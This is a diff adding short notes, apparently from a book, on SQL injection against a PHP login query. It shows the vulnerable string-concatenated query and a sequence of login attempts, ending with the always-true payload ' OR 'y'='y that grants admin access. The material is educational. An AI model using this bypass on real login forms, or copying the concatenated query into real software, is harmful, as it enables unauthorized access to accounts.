@@ -1,0 +1,39 @@
+Examples:
+---------
+$query = "SELECT * FROM USERS WHERE USER_NAME = '" . $username . "' AND PASSWORD = '" . $password . "'";
+
+Note from Book: We attempt authentication and try to “ guess ” the administrator password, imagining we have already managed to obtain through what ever means the administrator username.
+
+HTML Form POST:
++++++++++++++++
+Value Name 	Value Data
+----------	----------
+username 	admin
+password 	admin
+
+Result: Failed.
+
+Value Name	Value Data
+----------	----------
+username 	admin
+password 	crackwh0re
+
+Result: Granted.
+
+Here we use Logical Operator.
+
+Value Name 	Value Data
+----------	----------
+username 	admin
+password 	' OR 'y'='z
+
+Result: Failed.
+
+Using true Logical Form.
+
+Value Name 	Value Data
+----------	----------
+username 	admin
+password 	' OR 'y'='y
+
+Result: Granted.
